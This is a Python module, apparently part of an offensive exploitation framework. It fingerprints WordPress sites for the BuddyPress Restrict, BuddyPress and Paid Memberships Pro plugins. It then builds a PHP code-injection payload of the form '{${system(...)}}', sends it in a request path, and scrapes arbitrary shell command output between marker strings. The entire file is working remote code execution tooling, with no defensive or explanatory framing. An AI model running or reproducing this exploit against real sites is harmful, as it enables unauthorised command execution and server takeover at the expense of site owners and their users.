#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Restrictions for BuddyPress WordPress plugin helpers."""

from __future__ import annotations

import re
from typing import Dict
from urllib.parse import quote

from core.framework.base_module import BaseModule

MARKER = "LLC4RGE"


class Bp_restrict(BaseModule):
    """BuddyPress Restrict plugin fingerprint and eval payload builder."""

    PLUGIN_SLUGS = (
        ("bp-restrict", "bp_restrict"),
        ("buddypress", "buddypress"),
        ("paid-memberships-pro", "pmpro"),
    )

    def bp_restrict_fingerprint(self) -> Dict[str, bool]:
        found = {"bp_restrict": False, "buddypress": False, "pmpro": False}
        resp = self.http_request("GET", "/", timeout=12)
        if resp:
            body = (resp.text or "").lower()
            if "bp-restrict" in body or "restrictions-for-buddypress" in body:
                found["bp_restrict"] = True
            if "buddypress" in body:
                found["buddypress"] = True
            if "paid-memberships-pro" in body or "pmpro" in body:
                found["pmpro"] = True
        for plugin, key in self.PLUGIN_SLUGS:
            if found[key]:
                continue
            readme = self.http_request(
                "GET",
                f"/wp-content/plugins/{plugin}/readme.txt",
                timeout=12,
            )
            if readme and int(readme.status_code or 0) == 200:
                if "stable tag" in (readme.text or "").lower():
                    found[key] = True
        return found

    @staticmethod
    def bp_restrict_eval_payload(cmd: str, marker: str = MARKER) -> str:
        safe_cmd = (cmd or "id").replace("'", "\\'")
        php = f"system('echo {marker}; {safe_cmd}; echo {marker}')"
        return "{${" + php + "}}"

    def bp_restrict_request_rce(self, cmd: str) -> Dict[str, object]:
        payload = self.bp_restrict_eval_payload(cmd)
        path = "/" + quote(payload, safe="{}$();'/ ")
        resp = self.http_request("GET", path, timeout=25)
        out = None
        code = 0
        if resp:
            code = int(resp.status_code or 0)
            text = resp.text or ""
            if MARKER in text:
                chunks = text.split(MARKER)
                if len(chunks) >= 3:
                    out = chunks[1].strip()
        return {
            "status_code": code,
            "executed": out is not None,
            "command_output": out,
            "path": path,
        }